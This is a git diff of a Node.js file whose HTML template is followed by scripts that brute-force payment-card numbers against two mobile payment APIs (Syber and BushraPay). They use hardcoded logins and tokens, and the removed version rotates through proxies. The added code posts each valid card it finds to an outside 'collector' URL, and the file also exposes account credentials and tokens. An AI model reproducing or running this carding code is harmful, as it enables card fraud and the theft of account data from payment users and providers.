@@ -55,67 +55,68 @@ const html = `
     </section>
   </body>
 </html>
-`
-const fs = require('fs');
-const HttpsProxyAgent = require('https-proxy-agent');
-var proxies = [ "164.92.73.145:3128", "135.148.95.28:3128", "190.110.208.229:999"]
-//var proxies = [    "154.79.242.178:1686",    "98.148.96.228:8111",    "81.143.236.200:443"]
-
-var cookie = require('cookie');
-
-
-  var num = "0118883434";
-const fetch = require('node-fetch');
-login = { userIdentifier: num,password:num,fireBaseToken:"diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO"};
-
-  function fish(){
-var card = "6391730"+rand(8);
-//card = "6391871200106647";
-//Math.random().toString().slice(2,11);
-var random = Math.floor(Math.random()*proxies.length);
-    var proxy = proxies[random];
-var Agent = new HttpsProxyAgent('http://'+proxy);
-fetch('https://syberapp.sybertechnology.com/api/login',{
-  method: 'POST',
-  body:JSON.stringify(login),
-  headers: {
-    'content-type': 'application/json',
-    'Authorization':'xwrsy67Un9oshl8H=c5g',
-    'Version':'100',
-    'User-Agent':'okhttp/4.9.1',
-  },
-  agent: Agent
-}).then((response) =>{ 
-  
-  var status = response.status;
-  if(status == 200){
-    
-var token = response.headers.get('set-cookie');
-cookies = cookie.parse(token);
-      var re = cookies["HttpOnly, remember-me-posc"];
-var id = gen(8)+"-"+gen(4)+"-"+gen(4)+"-"+gen(4)+"-"+gen(12);
-fetch('https://syberapp.sybertechnology.com/customerInfo',{
-  method: 'POST',
-  body:JSON.stringify(
-    {"transactionId":id,"serviceId":"000009001016","pan":card,"lat":"0.0","lng":"0.0","authType":"10"}
-    ),
-  headers: {
-    // 'application/json' is the modern content-type for JSON, but some
-    // older servers may use 'text/json'.
-    // See: http://bit.ly/text-json
-    'content-type': 'application/json',
-    'Authorization':'xwrsy67Un9oshl8H=c5g',
-    'Version':'100',
-    'User-Agent':'okhttp/4.9.1',
-   'Cookie':"remember-me-posc="+re
-  },
-  agent: Agent
-}).then(response=>response.json()).then(data=>{
-  if(data.errorCode){
-    //console.log("Error "+card + " "+data.errorCode);
-    fish();
-  }else if(data.responseStatus){
-    console.log("Success "+ card)
+`//import fetch from 'node-fetch'; 
+const fetch = require('node-fetch'); 
+const fs = require('fs'); 
+ 
+ 
+var token 
+function fish(){ 
+var card = "6391750"+gennum(9); 
+ 
+fetch('https://app.bushrapay.com/API/do/LoginNoImage', { 
+    method: 'POST', 
+    headers: { 
+        'Content-Type': 'application/json; charset=utf-8', 
+        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A105F Build/PPR1.180610.011)', 
+        'Host': 'app.bushrapay.com', 
+        'Connection': 'Keep-Alive', 
+        'Accept-Encoding': 'gzip', 
+        'Content-Length': '200' 
+    }, 
+    body: JSON.stringify({ 
+  "MobileVersion": "1.0.8", 
+  "Lang": "en", 
+  "Phone": "+249125774806", 
+  "Password": 
+  "b16edd5ba7867c0d5a4192d0f78bbfce21156865", 
+  "LastUpdate": "2022-12-02 11:57:18", 
+  "PlayerID": "exa0hwhd-6g7i-4701-ae04-83ba6"+gennum(7) 
+}) 
+}).then(response=>response.json()).then(data=>{ 
+token = data.Infos["Token"]; 
+ 
+  if(token == null){ 
+    console.log("Account Locked") 
+     
+  }else{ 
+fetch('https://app.bushrapay.com/API/do/Trans', { 
+    method: 'POST', 
+    headers: { 
+        'Authorization': 'Bearer '+token, 
+        'Content-Type': 'application/json; charset=utf-8', 
+        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A105F Build/PPR1.180610.011)' 
+    }, 
+    body: JSON.stringify({ 
+        'TransID':'4977'+gennum(4)+'-'+gennum(4)+'-'+gennum(4)+'-'+gennum(4)+'-41a140fa0c38' , 
+   // 49775629-1b57-41de-9ad9-41a140fa0c38 
+        'Fields': [ 
+            { 
+                'FieldID': 'd5c60415-04d8-408a-914f-0f253d62a9e1', 
+                'Msg': '', 
+                'Name': 'To Card', 
+                'InqServiceFieldID': 'd5c60415-04d8-408a-914f-0f253d62a9e1', 
+                'Value': card 
+            } 
+        ], 
+        'ServiceID': 'ff1d0a51-4546-49c8-9274-947b39982e67', 
+        'PaymentMethod': 'P', 
+        'Lang': 'en' 
+    }) 
+}).then(response => response.json()).then(data=>{ 
+  //console.log(data) 
+  if(data.Status == true){ 
+//fs.appendFile("live.txt",card+"\n",function (err) {if (err) throw err;console.log('Success! '+card);}); 
  fetch('https://renoche.000webhostapp.com/collector/accounts.php', {
     method: 'POST',
 
@@ -130,59 +131,44 @@ fetch('https://syberapp.sybertechnology.com/customerInfo',{
 {"id":card}
 )
 })
-fish()
-  }
-}).catch((error)=>{
-  if(error.code == 'ECONNREFUSED'){
-  console.log("Proxy Refused V2 "+proxy)
-fish()
-  }
-})
-
-  }else if(status == 403){
-console.log("Forbidden "+proxy)
-fish()
-}else if(status == 500){
-//console.log("System Error 500 : " + proxy )
-fish()
-}else if(status == 503){
-//console.log("System Error 500 : " + proxy )
-fish()
-}else if(status == 400){
-//console.log("System Error 500 : " + proxy )
-fish()
-}else if(status == 404){
-//console.log("System Error 500 : " + proxy )
-fish()
-}else{
-console.log("Account Locked "+status+" "+proxy)
-fish()
-}
-}).catch((error)=>{
-  if(error.code == 'ECONNREFUSED'){
-  console.log("Proxy Refused " +proxy)
-fish()
-  }
-})
-
-
-}
-fish();
-function gen(length) {
-    var result           = '';
-    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    var charactersLength = characters.length;
-    for ( var i = 0; i < length; i++ ) {
-        result += characters.charAt(Math.floor(Math.random() * charactersLength));
-    }
-    return result;
-}
-function rand(length) {
-    var result           = '';
-    var characters       = '0123456789';
-    var charactersLength = characters.length;
-    for ( var i = 0; i < length; i++ ) {
-        result += characters.charAt(Math.floor(Math.random() * charactersLength));
-    }
-    return result;
+console.log(card) 
+  }else if(data.Status == false){ 
+//fs.appendFile("error.txt","["+i+"]"+card+"\n",function (err) {if (err) throw err;}); 
+//console.log("not Active") 
+  fish() 
+     
+  } 
+}); 
+ 
+} // close if 
+}); 
+} 
+//clearInterval(timer) 
+ 
+fish() 
+ 
+function gennum(length) { 
+    var result           = ''; 
+    var characters       = '0123456789'; 
+    //ABCDEFGHIJKLMNOPQRSTUVWXYZ 
+    var charactersLength = characters.length; 
+    for ( var i = 0; i < length; i++ ) { 
+        result += characters.charAt(Math.floor(Math.random() * charactersLength)); 
+    } 
+    return result; 
+} 
+ 
+function pad(num, size) { 
+    var s = "000000000" + num; 
+    return s.substr(s.length-size); 
+} 
+function gen(length) { 
+    var result           = ''; 
+    var characters       = 'abcdefghijklmnopqrstuvwxyz0123456789'; 
+    //ABCDEFGHIJKLMNOPQRSTUVWXYZ 
+    var charactersLength = characters.length; 
+    for ( var i = 0; i < length; i++ ) { 
+        result += characters.charAt(Math.floor(Math.random() * charactersLength)); 
+    } 
+    return result; 
 }
